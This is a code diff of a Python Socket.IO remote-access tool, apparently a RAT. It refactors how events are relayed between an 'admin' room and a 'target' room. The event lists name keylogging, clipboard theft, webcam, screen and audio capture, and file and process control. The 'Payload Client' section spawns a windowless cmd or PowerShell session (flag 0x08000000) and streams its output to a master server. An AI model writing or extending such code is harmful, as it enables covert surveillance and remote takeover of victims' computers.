@@ -75,23 +75,17 @@ ADMIN_EVENTS = [
     'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
     'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send'
 ]
-for ev in ADMIN_EVENTS:
-    @socketio.on(ev)
-    def handle_admin_proxy(data, e=ev):
-        forward_event(e, data, ROOM_TARGET)
+# --- Direct Event Registration (Unique Names) ---
+def create_proxy_handler(ev_name, room_dest):
+    def proxy_handler(data=None):
+        socketio.emit(ev_name, data, room=room_dest, include_self=False)
+    return proxy_handler
 
-# Register Target -> Admin Proxy
-TARGET_EVENTS = [
-    'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
-    'file_list', 'file_upload_status', 'file_delete_status', 'process_data', 'process_kill_status',
-    'audio_started', 'audio_stopped', 'audio_chunk', 'audio_error', 'vitals_update',
-    'monitor_data', 'monitor_switched', 'keylog_data', 'keylog_cleared',
-    'clipboard_content', 'clipboard_status', 'chat_received', 'chat_data', 'alert_sent'
-]
+for ev in ADMIN_EVENTS:
+    socketio.on_event(ev, create_proxy_handler(ev, ROOM_TARGET))
+
 for ev in TARGET_EVENTS:
-    @socketio.on(ev)
-    def handle_target_proxy(data, e=ev):
-        forward_event(e, data, ROOM_ADMINS)
+    socketio.on_event(ev, create_proxy_handler(ev, ROOM_ADMINS))
 
 # ============================================================
 #  Payload Client (Role: Client)
@@ -191,13 +185,13 @@ def run_client(master_url):
         shell = 'powershell.exe' if data.get('shell') == 'powershell' else 'cmd.exe'
         proc = subprocess.Popen(shell, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000, bufsize=0)
         client_state['term']['p'] = proc
-        def read():
+        def read_term():
             while proc.poll() is None:
                 try:
                     c = proc.stdout.read(1024)
                     if c: sio.emit('terminal_output', {'output': c.decode('utf-8', errors='replace')})
                 except: break
-        threading.Thread(target=read, daemon=True).start()
+        threading.Thread(target=read_term, daemon=True).start()
         sio.emit('terminal_started', {'shell': data.get('shell')})
 
     @sio.on('terminal_input')
